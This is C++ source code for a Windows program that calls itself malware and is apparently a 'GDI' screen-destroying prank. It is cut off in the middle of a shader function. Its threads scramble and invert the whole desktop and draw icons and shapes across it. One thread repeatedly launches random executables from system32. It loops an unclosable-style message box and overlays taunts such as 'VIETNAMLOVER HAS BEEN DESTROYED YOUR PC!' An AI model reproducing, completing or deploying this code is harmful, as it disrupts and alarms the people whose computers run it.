#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<windef.h>
#include<fstream>
#include<cstdlib>
#include<memory>
#include<iosfwd>
#include<string>
#include<intrin.h>
#include<algorithm>

#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

using namespace std;

const int W = 1920;
const int H = 1080;
bool g_running = true;
bool g_shader7_running = false;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
COLORREF Hue(int length) {
    if (red != length) {
        red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
                return RGB(0, 0, 0);
            }
        }
    }
}
void InitDPI() {
    HMODULE hModule = LoadLibraryA("user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
    if (SetProcessDPIAware) {
        SetProcessDPIAware();
    }
    FreeLibrary(hModule);
}
int refreshscr() {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    InvalidateRect(0, 0, 0);
    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    ReleaseDC(0, hdc);
    return 1;
}
DWORD xs;
void Seedxorshift32(DWORD dwSeed) {
    xs = dwSeed;
}
DWORD xorshift32() {
    xs ^= xs << 13;
    xs ^= xs >> 17;
    xs ^= xs << 5;
    return xs;
}
DWORD WINAPI msg(LPVOID lpvd) 
{
    while (true)
    {
        MessageBoxW(NULL, L"WHY YOU EXECUTED THIS MALWARE? NOW, YOU CAN ONLY SAY GOODBYE TO YOUR DATA! ARE YOU READY TO REINSTALL WINDOWS ON THIS STUPID PC?!", L"dcfvgrf.exe", MB_OK | MB_ICONINFORMATION);
    }
    return 0;

}
DWORD WINAPI randsystem32program(LPVOID lpParam)
{
    HANDLE FirstFileW;
    int v2;
    struct _WIN32_FIND_DATAW FindFileData;

    while (true)
    {
        do
        {
            FirstFileW = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.exe", &FindFileData);
            ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
        } while (!FindNextFileW(FirstFileW, &FindFileData));
        do
        {
            ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
            v2 = rand();
            Sleep(v2 % 5000);
        } while (FindNextFileW(FirstFileW, &FindFileData));
    }
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, hBrush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    ReleaseDC(0, hdc);
    DeleteObject(hrgn); DeleteObject(hBrush);
}
DWORD WINAPI circle(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int size = 400 + ((1 + rand() % 14) * 100);
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 100) {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(5);
        }
        Sleep(100);
    }
    return 0;
}
DWORD WINAPI ballz(LPVOID lpParam) {
    int radius = 18;
    int numCircles = 140;
    int cx = 150, cy = 150;
    int dx = 8, dy = 8;
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        for (int i = 0; i < numCircles; i++) {
            int spiralRadius = i * 0.85;
            int x = cx + spiralRadius * cos(i * 0.5);
            int y = cy + spiralRadius * sin(i * 0.5);

            HBRUSH brush = CreateSolidBrush(Hue(239));
            SelectObject(hdc, brush);

            Ellipse(hdc, x - radius, y - radius, x + radius, y + radius);

            DeleteObject(brush);
        }

        cx += dx;
        cy += dy;

        if (cx + radius > w || cx - radius < 0) dx = -dx;
        if (cy + radius > h || cy - radius < 0) dy = -dy;

        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI squarez(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        for (int x = 0; x <= w; x += 64) {
            SelectObject(hdc, CreateSolidBrush(RGB(255 - (rand() % 255), rand() % 255, (rand() % 129) * 2)));
            PatBlt(hdc, x, 0, 64, h, PATINVERT);
            Sleep(100);
        }
        for (int y = 0; y <= h; y += 64) {
            SelectObject(hdc, CreateSolidBrush(RGB((rand() % 65) * 4, rand() % 255, (rand() % 33) * 8)));
            HPEN hPen = CreatePen(PS_NULL, 0, RGB(0,0,0));
            SelectObject(hdc, hPen);
            Rectangle(hdc, 0, y, w, y + 65);
            DeleteObject(hPen);
            Sleep(100);
        }
    }
}
DWORD WINAPI icon1(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int xf = 0;
    int yf = 0;
    int signX = 15;
    int signY = 5;
    int radius = 100.0f;
    double angle = 0;
    int x, y;
    int centerX, centerY;
    int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
    CURSORINFO cur;
    while (1) {
        HDC hdc = GetDC(HWND_DESKTOP);
        xf += signX;
        yf += signY;
        centerX = origX - (w / 4), centerY = origY - (h / 4);
        x = (sin(angle) * radius) + centerX, y = (cos(angle) * radius) + centerY;
        int icon_x = GetSystemMetrics(SM_CXICON);
        int icon_y = GetSystemMetrics(SM_CYICON);
        GetCursorInfo(&cur);

        for (INT i = 64; i > 8; i -= 8) {
            DrawIconEx(hdc, (50 + x - i + xf) - icon_x, (50 + y - i + yf) - icon_y, LoadCursor(0, IDC_SIZEWE), 7 * GetSystemMetrics(SM_CXICON), 7 * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        }
        angle = fmod(angle + PI / radius, PI * radius);

        if (yf == 0)
        {
            signY = 5;
        }

        if (xf == 0)
        {
            signX = 15;
        }

        if (yf >= GetSystemMetrics(1))
        {
            signY -= 5;
        }

        if (xf >= GetSystemMetrics(0))
        {
            signX -= 15;
        }
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return(1);
}
DWORD WINAPI icon2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc;
    HICON shifang;
    while (true) {
        shifang = LoadCursor(0, IDC_APPSTARTING);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_ARROW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_CROSS);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_HELP);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_IBEAM);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_NO);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_WAIT);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZENWSE);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZENESW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_UPARROW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadIcon(0, IDI_WARNING);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadIcon(0, IDI_QUESTION);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
        shifang = LoadIcon(0, IDI_APPLICATION);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(20);
    }
}
DWORD WINAPI bitblt1(LPVOID lpParam) 
{
    int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrH = GetSystemMetrics(SM_CYSCREEN);

    POINT wPt[3];
    RECT wRect;

    while (true)
    {
        HDC desk = GetDC(0);
        GetWindowRect(GetDesktopWindow(), &wRect);

        int c = 10;

        wPt[0].x = wRect.left + rand() % 11 - 5;
        wPt[0].y = wRect.top + rand() % 21 - 10;


        wPt[1].x = wRect.right + rand() % 21 - 10;
        wPt[1].y = wRect.top + rand() % 41 - 20;


        wPt[2].x = wRect.left + c - rand() % 21 - c;
        wPt[2].y = wRect.bottom - c + rand() % 21 - c;


        PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

        Sleep(2);
        ReleaseDC(0, desk);
    }

    return 0;

}
DWORD WINAPI bitblt2(LPVOID lpvd)
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        HBRUSH brush = CreateSolidBrush(RndRGB);
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI bitblt3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    while (true)
    {
        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, DSTINVERT);
        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, SRCCOPY);
        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, MERGEPAINT);
        Sleep(15);
    }
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI bitblt4(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, NOTSRCCOPY);
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI bitblt5(LPVOID) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (true) {
        HDC hdc=GetDC(0);
        BitBlt(hdc,0,0,w,h,hdc,-w/10,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,hdc,w/10*9,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,hdc,0,-h/10,SRCCOPY);
        BitBlt(hdc,0,0,w,h,hdc,0,h/10*9,SRCCOPY);
        HBRUSH br=CreateSolidBrush(RndRGB); SelectObject(hdc,br);
        BitBlt(hdc,0,0,w,h,hdc,0,0,PATINVERT);
        DeleteObject(br);
        ReleaseDC(0,hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI bitblt6(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    for (;;)
    {
        BitBlt(hdc, 2, 2, w / 2, h / 2, hdc, 0, 0, SRCPAINT);
        BitBlt(hdc, (w / 2) - 2, 2, w / 2, h / 2, hdc, w / 2, 0, SRCPAINT);
        BitBlt(hdc, 2, (h / 2) - 2, w / 2, h / 2, hdc, 0, h / 2, SRCPAINT);
        BitBlt(hdc, (w / 2) - 2, (h / 2) - 2, w / 2, h / 2, hdc, w / 2, h / 2, SRCPAINT);
        Sleep(50);
    }
}
DWORD WINAPI patblt1(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    while (true)
    {
        HBRUSH brush = CreateSolidBrush(RndRGB);
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, rand() % x, rand() % y, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(GetDesktopWindow(), hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI stretchblt1(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        SetStretchBltMode(hdc, HALFTONE);
        StretchBlt(hdc, 1, 1, sw + 2, sh + 2, hdc, 0, 0, sw, sh, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI mixblt1(LPVOID lpParam) {
    int block_w = 80, block_h = 80;
    while (true) {
        int can1 = 1;
        int jia1 = 0, jia2 = 0, x = 0; int y = 0;
        int x1 = 0, y1 = 0, x2 = 0, y2 = 0;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BOOL bianliang1 = true;
        while (bianliang1) {
            jia1 = jia1 + block_w;
            if (jia1 > w) { bianliang1 = false; }
            else { can1 = can1 + 1; }
        }
        can1 = can1 + 1; bianliang1 = true;
        int can2 = 1;
        while (bianliang1) {
            jia2 = jia2 + block_h;
            if (jia2 > h) { bianliang1 = false; }
            else { can2 = can2 + 1; }
        }
        can2 = can2 + 1;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int jin = 0; jin < can2 + 1; jin++) {
            for (int gui = 0; gui < can1 + 1; gui++) {
                x = rand() % can1, y = jin;
                if (x == 1) { x1 = 0; }
                else if (x == 2) { x1 = block_w; }
                else { x1 = block_w * x - block_w; }

                if (y == 1) { y1 = 0; }
                else if (y == 2) { y1 = block_h; }
                else { y1 = block_h * y - block_h; }

                x = rand() % can1, y = rand() % can2;
                if (x == 1) { x2 = 0; }
                else if (x == 2) { x2 = block_w; }
                else { x2 = block_w * x - 1; }

                if (y == 1) { y2 = 0; }
                else if (y == 2) { y2 = block_h; }
                else { y2 = block_h * y - 1; }

                StretchBlt(hcdc, x1, y1, block_w, block_h, hcdc, x2, y2, block_w, block_h, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        jia1 = 0, jia2 = 0, can1 = 0, can2 = 0;
        Sleep(500);
    }
    return 0;
}
DWORD WINAPI mixblt2(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        StretchBlt(hcdc, 1, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, 0, 1, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, -1, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, 0, -1, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        HBRUSH hBrush = CreateSolidBrush(RndRGB);
        SelectObject(hcdc, hBrush);
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteObject(hBrush);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI mixblt3(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        Seedxorshift32(__rdtsc());
        desk = GetDC(0);
        SelectObject(desk, CreateHatchBrush(rand() % 7, RndRGB));
        Ellipse(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
        Rectangle(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
        BitBlt(desk, rand() % 10, rand() % 10, sw, sh, desk, rand() % 10, rand() % 10, 0x2837E28);
        Sleep(20);
        if (rand() % 35 == 5) InvalidateRect(0, 0, 0);
    }
}
DWORD WINAPI mixblt4(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCERASE);
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI mixblt5(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI text1(LPVOID lpvd)
{
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    LPCSTR text0 = 0;
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    LPCSTR text4 = 0;
    LPCSTR text5 = 0;
    LPCSTR text6 = 0;
    while (1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        text0 = "dcfvgrf.exe";
        text1 = "WHY YOU EXECUTED THIS MALWARE?!";
        text2 = "VIETNAMLOVER HAS BEEN DESTROYED YOUR PC!";
        text3 = "R.I.P DUMB PC USER!";
        text4 = "GOODBYE YOUR STUPID PC!";
        text5 = "ARE YOU READY TO REINSTALL WINDOWS?!";
        text6 = "IDK WHY YOU ARE SO STUPID!";
        SetTextColor(hdc, RndRGB);
        HFONT font = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Times New Roman");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % x, rand() % y, text0, strlen(text0));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
        Sleep(10);
        DeleteObject(font);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI text2(LPVOID lpParam)
{
    HDC hdc;
    LPCWSTR text1 = L"R.I.P YOUR PC!";
    LPCWSTR text2 = L"STOP CRYING NOW!";
    LPCWSTR text3 = L"CRYING WON'T HELP FIX YOUR PC!";
    LPCWSTR text4 = L"JUST F*CKING DEAL WITH IT!";

    while (true)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        SetBkColor(hdc, RndRGB);
        SetTextColor(hdc, RndRGB);
        TextOutW(hdc, 25, 25, text1, wcslen(text1));
        TextOutW(hdc, 25, 50, text2, wcslen(text2));
        TextOutW(hdc, 25, 75, text3, wcslen(text3));
        TextOutW(hdc, 25, 100, text4, wcslen(text4));
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI shader1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i) ^ (y * i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}
DWORD WINAPI shader2(LPVOID lpParam) {
    RGBTRIPLE* rgbtriple; int xxx = 0; POINT point[3];
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), increment = 1 + rand() % 20, rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmi = { 40, w, h, 1, 24 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w, t = (x ^ y);
            rgbtriple[i].rgbtRed += t + x + xxx;
            rgbtriple[i].rgbtGreen ^= t + (x | y) + i + xxx;
            rgbtriple[i].rgbtBlue += t + y + xxx;
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -2 + rand() % 5, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        if (rand() % 10 >= 5) {
            point[0].x = increment; point[0].y = -increment;
            point[1].x = w + increment; point[1].y = increment;
            point[2].x = -increment; point[2].y = h - increment;
        }
        else {
            point[0].x = -increment; point[0].y = increment;
            point[1].x = w - increment; point[1].y = -increment;
            point[2].x = increment; point[2].y = h + increment;
        }
        PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
        BitBlt(hcdc, rand() % 20, rand() % 20, w, h, hcdc, rand() % 20, rand() % 20, SRCPAINT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx += 5;
    }
}
DWORD WINAPI shader3(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
